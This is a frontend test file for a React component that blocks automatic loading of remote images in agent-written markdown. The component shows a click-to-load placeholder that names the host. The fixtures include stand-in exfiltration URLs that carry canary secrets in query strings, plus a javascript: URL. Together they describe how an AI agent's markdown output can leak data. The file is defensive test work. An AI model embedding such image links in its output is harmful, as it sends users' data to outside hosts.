/** @jest-environment jsdom */
import "@testing-library/jest-dom";
import { fireEvent, render, screen } from "@testing-library/react";

import { AGENT_MARKDOWN_COMPONENTS, AgentMarkdownImage } from "../agent-markdown-image";

const REMOTE = "https://leak.example.test/pixel.png?d=CANARY-SECRET";

describe("AgentMarkdownImage", () => {
  it("shows a remote image as a placeholder with its alt text and host, and fetches nothing", () => {
    const { container } = render(<AgentMarkdownImage src={REMOTE} alt="status" />);

    expect(container.querySelector("img")).toBeNull();
    const placeholder = screen.getByRole("button", { name: /status/ });
    expect(placeholder).toHaveTextContent("leak.example.test");
    expect(placeholder.textContent).not.toContain("CANARY-SECRET");
  });

  it("loads the remote image only after the owner clicks the placeholder", () => {
    const { container } = render(<AgentMarkdownImage src={REMOTE} alt="status" />);

    fireEvent.click(screen.getByRole("button", { name: /status/ }));

    expect(container.querySelector("img")).toHaveAttribute("src", REMOTE);
  });

  it.each([
    ["a plain http image", "http://127.0.0.1:9/leak?d=CANARY"],
    ["a protocol-relative image", "//leak.example.test/x.png"],
    ["an app path that would send the owner's cookies", "/api/instances/inst_1/status"],
    ["a blob URL", "blob:https://app.example.test/abc"],
    ["a script URL", "javascript:alert(1)"],
  ])("does not render %s as an image on render", (_label, src) => {
    const { container } = render(<AgentMarkdownImage src={src} alt="chart" />);

    expect(container.querySelector("img")).toBeNull();
  });

  it("names the host of a protocol-relative image, which is where a click sends the query", () => {
    render(<AgentMarkdownImage src="//leak.example.test/x.png?d=CANARY-SECRET" alt="status" />);

    const placeholder = screen.getByRole("button", { name: /status/ });
    expect(placeholder).toHaveAttribute("title", "Load image from leak.example.test");
    expect(placeholder.textContent).not.toContain("unknown host");
    expect(placeholder.textContent).not.toContain("CANARY-SECRET");
  });

  it("names this app for a relative image path, since the browser resolves it on the same origin", () => {
    render(<AgentMarkdownImage src="chart.png" alt="chart" />);

    expect(screen.getByRole("button", { name: /chart/ })).toHaveAttribute("title", "Load image from this app");
  });

  it("renders an inline PNG data image directly, since it needs no request", () => {
    const src = "data:image/png;base64,iVBORw0KGgo=";
    const { container } = render(<AgentMarkdownImage src={src} alt="dot" />);

    expect(container.querySelector("img")).toHaveAttribute("src", src);
  });

  it("falls back to a plain label when the image has no source", () => {
    const { container } = render(<AgentMarkdownImage alt="diagram" />);

    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByText("diagram")).toBeInTheDocument();
  });

  it("is the image override every agent-written markdown renderer uses", () => {
    expect(AGENT_MARKDOWN_COMPONENTS.img).toBe(AgentMarkdownImage);
  });
});
